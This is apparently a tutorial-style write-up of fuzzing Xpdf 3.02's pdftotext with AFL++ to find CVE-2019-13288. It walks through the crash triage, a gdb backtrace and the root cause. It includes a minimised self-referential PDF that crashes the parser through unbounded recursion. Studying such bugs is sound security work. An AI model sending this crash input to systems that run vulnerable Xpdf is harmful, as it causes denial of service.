# Fuzzing Xpdf 3.02 with AFL++ — CVE-2019-13288

## Target
- Software: Xpdf 3.02, binary `pdftotext`
- Compiled with AFL instrumentation (`afl-clang-fast` / `afl-clang-fast++`)

## Fuzzing campaign
I ran AFL++ on `pdftotext`, using the PDFs in `pdf_examples/` as the **seed corpus**:
```
afl-fuzz -i pdf_examples -o out -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output
```
- `-i pdf_examples` → input seeds
- `-o out` → where AFL stores its findings (queue, crashes, hangs)
- `@@` → placeholder replaced by the mutated input file at each run

After some time, AFL found a first crash in `~/fuzzing_xpdf/out/default/crashes`:
```
id:000000,sig:11,src:001830,time:3403994,execs:1401821,op:trim,rep:1
```
(`sig:11` = SIGSEGV)

## Reproducing the crash
Running the crashing file directly through `pdftotext` confirms the segfault:
```
~/fuzzing_xpdf/install/bin/pdftotext "id:000000,sig:11,..." /tmp/out.txt
```
```
Error (215): Dictionary key must be a name object
Segmentation fault (core dumped)
```

## Debugging with gdb
```
gdb -q --args ~/fuzzing_xpdf/install/bin/pdftotext "id:000000,sig:11,..." /tmp/out.txt
(gdb) run
(gdb) bt
```
The top frames (`#0`–`#4`) are inside `printf`/`error` — that's just Xpdf trying to print
an error message when the stack is already exhausted. The real problem is the cycle below,
which repeats identically all the way down, always with `objNum=3`:
```
Parser::getObj (Parser.cc:94)
  -> XRef::fetch (XRef.cc:823)        num=3
    -> Object::arrayGet (Object.h:229)
      -> Stream::addFilters (Stream.cc:113)
        -> Parser::makeStream (Parser.cc:203)
          -> Parser::getObj   <-- recursion restarts
```

## Minimizing the input
```
afl-tmin -i "id:000000,sig:11,..." -o ~/crash_minimal.pdf -- ~/fuzzing_xpdf/install/bin/pdftotext @@ /tmp/out.txt
```
Minimized PDF:
```
1 0 obj<<
3 0 obj<</F 3 0R/Length 0>>stream
trailer<</Root 1 0R
```

## Root cause
Object 3 is a stream whose filter (`/F`) references **object 3 itself** (`3 0 R`).
Resolving object 3 requires resolving its filter, which is object 3 again → unbounded
recursion. Each call consumes stack space until the stack overflows (stack exhaustion).

- Vulnerability class: uncontrolled recursion (CWE-674)
- CVE: CVE-2019-13288
- Impact: denial of service (crash). No controlled memory corruption here.

## The fix
Later versions add a recursion-depth limit in the object parser, so a self-referential
object stops the parsing instead of recursing forever.



